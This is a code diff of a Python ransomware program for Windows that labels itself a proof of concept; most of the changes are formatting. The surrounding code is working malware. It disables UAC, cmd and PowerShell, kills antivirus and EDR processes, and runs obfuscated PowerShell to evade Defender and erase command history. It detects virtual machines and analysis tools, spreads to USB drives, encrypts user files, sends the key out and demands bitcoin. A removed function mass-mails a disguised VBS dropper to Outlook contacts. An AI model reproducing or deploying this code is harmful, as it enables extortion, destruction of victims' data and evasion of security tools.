@@ -41,13 +41,17 @@ from zeroize import mlock, munlock, zeroize1
 from edx42 import dx42  # type: ignore
 
 # Decode the encoded URL using the dx42 function.
-YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode() # Replace with your encoded URL
+YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL
 # Encode a URL using the ex42 function from the edx42 module
 # Example: encoded_url = ex42(b"https://your-tor-server.onion".encode())
-YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode() # Replace with your encoded proxy
+YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode()  # Replace with your encoded proxy
 YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
-YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode() # Replace with your encoded email address
-YOUR_DOWNLOAD_URL = dx42(b"YOUR_ENCODED_DOWNLOAD_URL").decode() # Replace with your encoded download URL
+YOUR_EMAIL_ADDRESS = dx42(
+    b"YOUR_ENCODED_EMAIL_ADDRESS"
+).decode()  # Replace with your encoded email address
+YOUR_DOWNLOAD_URL = dx42(
+    b"YOUR_ENCODED_DOWNLOAD_URL"
+).decode()  # Replace with your encoded download URL
 RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
 MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAnCK4qHp0Ie/ClNE4nUaN
 wa8L36BKek8FoA0+hkUsEFdl/85M8D1sMkniG7ytzATcroLT2fmBuJP+HE0GJu8T
@@ -61,7 +65,7 @@ j2i4iYNNBE/Upy5a068ENukV8FeswaZ+1bVbtivFEFKUwq2ACFRpWYTFXXsc605D
 /mVZn4oZjcs024o4QF6eKNyeW9eOyXcL+Q7T5WEexIfAfFVsiaG5vvjRS9aoigN0
 gCnFTWHHUYN7SsuCUlWqlyHfO3W7s8NTSPm8F7uoAzRkRgpGF3WjSblJWsz9fuAw
 9uTrsCjzkyencwnXJwLxQVMCAwEAAQ==
------END PUBLIC KEY-----""" # Replace with your public key if needed
+-----END PUBLIC KEY-----"""  # Replace with your public key if needed
 VBS = rf"""Option Explicit
 
 Dim url, filename, tempFolder, fullPath
@@ -99,6 +103,7 @@ If Not wsh Is Nothing Then Set wsh = Nothing
 """
 ID = ""
 
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -123,7 +128,9 @@ def disable_cmd():
 def disable_powershell():
     ps_path = r"Software\Policies\Microsoft\Windows\PowerShell"
     console_path = r"Software\Policies\Microsoft\Windows\PowerShell"
-    restrict_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
+    restrict_path = (
+        r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
+    )
     policy_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
     with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, ps_path) as reg:
         winreg.SetValueEx(reg, "EnableScripts", 0, winreg.REG_DWORD, 0)
@@ -371,11 +378,11 @@ def block_processes():
         "powershell -ExecutionPolicy Bypass -EncodedCommand UwAAAGUAAAB0AAAALQAAAE0AAABwAAAAUAAAAHIAAABlAAAAZgAAAGUAAAByAAAAZQAAAG4AAABjAAAAZQAAACAAAAAtAAAARQAAAG4AAABhAAAAYgAAAGwAAABlAAAAQwAAAG8AAABuAAAAdAAAAHIAAABvAAAAbAAAAGwAAABlAAAAZAAAAEYAAABvAAAAbAAAAGQAAABlAAAAcgAAAEEAAABjAAAAYwAAAGUAAABzAAAAcwAAACAAAABEAAAAaQAAAHMAAABhAAAAYgAAAGwAAABlAAAAZAAAAA=="
         f"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ControlledFolderAccessAllowedApplication '{sys.executable}'\""
         # Remove-Item -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
-        "powershell -ExecutionPolicy Bypass -EncodedCommand UgAAAGUAAABtAAAAbwAAAHYAAABlAAAALQAAAEkAAAB0AAAAZQAAAG0AAAAgAAAALQAAAFAAAABhAAAAdAAAAGgAAAAgAAAAIgAAACQAAABlAAAAbgAAAHYAAAA6AAAAVQAAAFMAAABFAAAAUgAAAFAAAABSAAAATwAAAEYAAABJAAAATAAAAEUAAABcAAAAQQAAAHAAAABwAAAARAAAAGEAAAB0AAAAYQAAAFwAAABSAAAAbwAAAGEAAABtAAAAaQAAAG4AAABnAAAAXAAAAE0AAABpAAAAYwAAAHIAAABvAAAAcwAAAG8AAABmAAAAdAAAAFwAAABXAAAAaQAAAG4AAABkAAAAbwAAAHcAAABzAAAAXAAAAFAAAABvAAAAdwAAAGUAAAByAAAAUwAAAGgAAABlAAAAbAAAAGwAAABcAAAAUAAAAFMAAABSAAAAZQAAAGEAAABkAAAATAAAAGkAAABuAAAAZQAAAFwAAABDAAAAbwAAAG4AAABzAAAAbwAAAGwAAABlAAAASAAAAG8AAABzAAAAdAAAAF8AAABoAAAAaQAAAHMAAAB0AAAAbwAAAHIAAAB5AAAALgAAAHQAAAB4AAAAdAAAACIAAAAgAAAALQAAAEUAAAByAAAAcgAAAG8AAAByAAAAQQAAAGMAAAB0AAAAaQAAAG8AAABuAAAAIAAAAFMAAABpAAAAbAAAAGUAAABuAAAAdAAAAGwAAAB5AAAAQwAAAG8AAABuAAAAdAAAAGkAAABuAAAAdQAAAGUAAAA="
+        "powershell -ExecutionPolicy Bypass -EncodedCommand UgAAAGUAAABtAAAAbwAAAHYAAABlAAAALQAAAEkAAAB0AAAAZQAAAG0AAAAgAAAALQAAAFAAAABhAAAAdAAAAGgAAAAgAAAAIgAAACQAAABlAAAAbgAAAHYAAAA6AAAAVQAAAFMAAABFAAAAUgAAAFAAAABSAAAATwAAAEYAAABJAAAATAAAAEUAAABcAAAAQQAAAHAAAABwAAAARAAAAGEAAAB0AAAAYQAAAFwAAABSAAAAbwAAAGEAAABtAAAAaQAAAG4AAABnAAAAXAAAAE0AAABpAAAAYwAAAHIAAABvAAAAcwAAAG8AAABmAAAAdAAAAFwAAABXAAAAaQAAAG4AAABkAAAAbwAAAHcAAABzAAAAXAAAAFAAAABvAAAAdwAAAGUAAAByAAAAUwAAAGgAAABlAAAAbAAAAGwAAABcAAAAUAAAAFMAAABSAAAAZQAAAGEAAABkAAAATAAAAGkAAABuAAAAZQAAAFwAAABDAAAAbwAAAG4AAABzAAAAbwAAAGwAAABlAAAASAAAAG8AAABzAAAAdAAAAF8AAABoAAAAaQAAAHMAAAB0AAAAbwAAAHIAAAB5AAAALgAAAHQAAAB4AAAAdAAAACIAAAAgAAAALQAAAEUAAAByAAAAcgAAAG8AAAByAAAAQQAAAGMAAAB0AAAAaQAAAG8AAABuAAAAIAAAAFMAAABpAAAAbAAAAGUAAABuAAAAdAAAAGwAAAB5AAAAQwAAAG8AAABuAAAAdAAAAGkAAABuAAAAdQAAAGUAAAA=",
     ]
     for cmd in powershell_commands:
         execute_command(cmd)
-    execute_command("powercfg /h off")a
+    execute_command("powercfg /h off")
     execute_command("fsutil behavior set disablelastaccess 1")
 
 
@@ -412,6 +419,7 @@ def start_encryption():
     ID = uuid.uuid1()
     key = bytearray(get_random_bytes(32))
     key_b64 = bytearray(base64.urlsafe_b64encode(b"DCRY+DKEY$" + bytes(key)))
+    # fmt: off
     target_dirs = [
         os.path.join(rf"C:\Users\{getpass.getuser()}", "Downloads"),
         os.path.join(rf"C:\Users\{getpass.getuser()}", "Documents"),
@@ -420,6 +428,7 @@ def start_encryption():
         os.path.join(rf"C:\Users\{getpass.getuser()}", "Videos"),
         os.path.join(rf"C:\Users\{getpass.getuser()}", "Music"),
     ]
+    # fmt: on
     bitmask = ctypes.windll.kernel32.GetLogicalDrives()
     try:
         mlock(key)
@@ -432,7 +441,8 @@ def start_encryption():
             "date": datetime.now().strftime("%d-%m-%Y"),
             "key": base64.b64encode(encrypted_key).decode(),
         }
-        if not dev_mode: send_key(data)
+        if not dev_mode:
+            send_key(data)
         with open(
             os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256"), "wb"
         ) as f:
@@ -467,6 +477,7 @@ def start_encryption():
 
 
 def encrypt_directory(directory_path, key):
+    # fmt: off
     files_targeted = [
         ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem",
         ".odt", ".ott", ".sxw", ".stw", ".uot", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2",
@@ -494,6 +505,7 @@ def encrypt_directory(directory_path, key):
         ".eml", ".msg", ".ost", ".pst",
         ".602", ".123", ".wk1", ".wks"
     ]
+    # fmt: on
     with ThreadPoolExecutor(max_workers=16) as executor:
         futures = []
         for root, _, files in os.walk(directory_path):
@@ -567,6 +579,14 @@ Don't Cry, just pay =)))"""
     disable_cmd()
 
 
+def disable_uac():
+    with winreg.OpenKey(
+        winreg.HKEY_LOCAL_MACHINE, KEY_PATH, 0, winreg.KEY_SET_VALUE
+    ) as k:
+        winreg.SetValueEx(k, "EnableLUA", 0, winreg.REG_DWORD, 0)
+        winreg.SetValueEx(k, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 1)
+
+
 def execute_command(command, shell=True, wait=True):
     if wait:
         return subprocess.Popen(
@@ -579,6 +599,7 @@ def execute_command(command, shell=True, wait=True):
 
 
 def disable_AV():
+    # fmt: off
     AV_processes = [
         "a2adguard", "a2adwizard", "a2antidialer", "a2cfg", "a2cmd", "a2free", "a2guard", "a2hijackfree", "a2scan", "a2service", "a2start", "a2sys", "a2upd", "aavgapi", "aawservice", "aawtray", "ad-aware", "ad-watch", "alescan", "anvir", "ashdisp", "ashmaisv",
         "ashserv", "ashwebsv", "aswupdsv", "atrack", "avgagent", "avgamsvr", "avgcc", "avgctrl", "avgemc", "avgnt", "avgtcpsv", "avguard", "avgupsvc", "avgw", "avkbar", "avk", "avkpop", "avkproxy", "avkservice", "avktray", "avktray", "avkwctl", "avkwctl",
@@ -593,6 +614,7 @@ def disable_AV():
         "xp-antispy", "zegarynka", "zlclient", "winpa'rolex", "mbam.exe", "mbamtray.exe", "mbae.exe", "mbae-svc.exe", "MpCmdRun.exe", "MsMpEng.exe", "SentinelAgent.exe", "SentinelHelperService.exe", "CSFalcon.exe", "symwscno", "f-prot95", "symwsc", "slee503",
         "CSFalconContainer.exe", "CSFalconService.exe", "CyServer.exe", "CyTray.exe",
     ]
+    # fmt: on
     for proc in AV_processes:
         execute_command(
             f'taskkill /f /im "{(proc + ".exe") if not proc.endswith(".dll") else proc}" /t'
@@ -600,10 +622,12 @@ def disable_AV():
 
 
 def disable_all():
+    # fmt: off
     black_list = [
         "cmd", "powershell", "regedit", "msconfig", 
         "taskmgr", "perfmon", "services", "netstat", "wmic",
     ]
+    # fmt: on
     for proc in black_list:
         execute_command(
             f'taskkill /f /im "{(proc + ".exe") if not proc.endswith(".dll") else proc}" /t'
@@ -616,6 +640,7 @@ def disable_all():
 
 
 def is_vm():
+    # fmt: off
     paths = [
         rf"{os.getenv('SystemDrive')}\Program Files\VMware\VMware Tools",
         rf"{os.getenv('SystemDrive')}\Program Files\Oracle\VirtualBox Guest Additions",
@@ -635,7 +660,7 @@ def is_vm():
         "Bochs",
         "Xen",
     ]
-    ඞ_procs = [ # sus processes ඞ
+    ඞ_procs = [  # sus processes ඞ - yes, I'm a prehistoric man
         "Dbgview", "ILSpy", "ProcessHacker", "SbieCtrl", "SbieSvc", "SecurityHealthSystray", "WMIADAP", "autoruns", "autorunsc",
         "BurpSuite", "Cain", "CarbonBlack", "cb", "Decoder", "dnSpy", "eventvwr", "Fiddler", "frida-server", "gdb", "gmer",
         "HookExplorer", "HttpAnalyzerV7", "HttpDebuggerUI", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idaw", "x64dbg",
@@ -643,6 +668,7 @@ def is_vm():
         "procexp", "procexp64", "procmon", "regmon", "regripper", "Sandboxie", "schtasks", "smartscreen",
         "sxutil", "sysmon", "tasklist", "tcpview", "VBoxService", "Wireshark", "Windasm", "windbg", "x32dbg",
     ]
+    # fmt: on
     try:
         output = subprocess.check_output(
             ["wmic", "computersystem", "get", "model"],
@@ -650,10 +676,7 @@ def is_vm():
             timeout=3,
             creationflags=subprocess.CREATE_NO_WINDOW,
         )
-        if any(
-            vm in output
-            for vm in vms
-        ):
+        if any(vm in output for vm in vms):
             return True
     except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
         pass
@@ -699,17 +722,12 @@ def is_vm():
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System")
         bios_info = winreg.QueryValueEx(key, "SystemBiosVersion")[0]
-
+        # fmt: off
         if any(vm in bios_info.upper() for vm in [
-            "VMWARE",
-            "VBOX",
-            "VIRTUALBOX",
-            "QEMU",
-            "XEN",
-            "HYPER-V",
-            "PARALLELS",
-            "BOCHS",
+            "VMWARE", "VBOX", "VIRTUALBOX", "QEMU",
+            "XEN", "HYPER-V", "PARALLELS", "BOCHS",
         ]):
+        # fmt: on
             return True
     except:
         pass
@@ -754,52 +772,6 @@ def infect_usb():
             pass
 
 
-def send_email(zip_password="dcry-ransomware-poc"):
-    temp_dir = os.getenv("TEMP")
-    vbs_name = "summary.docx.vbs"
-    vbs_full = os.path.join(temp_dir, vbs_name)
-    vbs_file_path = os.path.join(temp_dir, "mail.vbs")
-    zip_file_path = os.path.join(temp_dir, f"summary.7z")
-    files = [vbs_file_path, zip_file_path, vbs_full]
-    with open(vbs_full, "w") as f:
-        f.write(VBS)
-    os.system(f'attrib +h +s "{vbs_full}"')
-    with py7zr.SevenZipFile(zip_file_path, mode="w", password=zip_password) as archive:
-        archive.write(vbs_full, arcname=vbs_name)
-    vbs_code = f"""
-dim x
-on error resume next
-Set ol=CreateObject("Outlook.Application")
-Set out=WScript.CreateObject("Outlook.Application")
-Set mapi = out.GetNameSpace("MAPI")
-Set a = mapi.AddressLists(1)
-Set ae=a.AddressEntries
-For x=1 To ae.Count
-    Set ci=ol.CreateItem(0)
-    Set Mail=ci
-    Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
-    Mail.Subject = "Files You Requested"
-    Mail.Body = "Here is the requested document - use this password to extract the attached ZIP file: {zip_password}"
-    Mail.Attachments.Add("{zip_file_path}")
-    Mail.send
-Next
-ol.Quit
-""" # I don't know if it works anymore =)))
-    with open(vbs_file_path, "w") as f:
-        f.write(vbs_code)
-    os.system(f'start /b "" "{vbs_file_path}"')
-    for file in files:
-        try:
-            with open(file, "w") as f:
-                f.write(os.urandom(os.path.getsize(file)))
-        except:
-            pass
-        try:
-            os.remove(file)
-        except:
-            pass
-
-
 dev_mode = True
 if __name__ == "__main__":
     if not check_connection():
@@ -817,15 +789,9 @@ if __name__ == "__main__":
         block_processes()
         disable_all()
         infect_usb()
-        # send_email() # yeah, it doesn't work =(((
         delete_shadow_copy()
         start_encryption()
         change_wallpaper()
         shutdown()
     else:
         start_encryption()
-
-
-
-
-
